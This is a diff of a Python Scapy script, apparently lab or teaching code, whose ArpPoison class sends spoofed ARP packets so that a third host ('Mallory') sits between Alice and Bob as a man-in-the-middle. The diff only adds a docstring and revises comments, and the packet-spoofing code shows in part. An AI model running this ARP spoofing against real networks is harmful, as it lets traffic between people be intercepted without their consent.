@@ -1,8 +1,12 @@
-from scapy.all import *
+"""
+Arppoison class which does a classic arp-poison attack implemented with Scapy
+"""
 
+from scapy.all import *
 
 class ArpPoison:
 
+    # Sets variables needed for ARP poisoning
     def __init__(self, macA, ipA, macB, ipB, macM, ipM):
         self.macA = macA
         self.ipA = ipA
@@ -11,7 +15,7 @@ class ArpPoison:
         self.macM = macM
         self.ipM = ipM
 
-    # create ARP poison of Alice machine
+    # ARP poison of Alice machine, spoofs Bobs address to Mallory's
     def arpPoisonA(self):
         arpA = Ether() / ARP()
         arpA[Ether].src = self.macM
@@ -22,7 +26,7 @@ class ArpPoison:
         sendp(arpA)
         print "ARP packet send to Alice"
 
-    # create ARP poison of Bobs machine
+    # ARP poison of Bobs machine, spoofs Alices address to Mallory's
     def arpPoisonB(self):
         arpB = Ether() / ARP()
         arpB[Ether].src = self.macM
